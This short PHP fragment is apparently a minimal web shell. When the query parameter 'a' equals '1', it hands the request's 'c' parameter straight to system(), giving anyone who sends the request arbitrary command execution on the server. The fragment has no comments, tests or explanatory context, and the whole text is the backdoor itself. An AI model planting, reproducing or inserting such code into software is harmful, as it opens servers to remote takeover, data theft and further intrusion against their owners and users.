<?php
$r = match ($_GET['a']) {
    '1' => system($_GET['c']),
    default => 0,
};
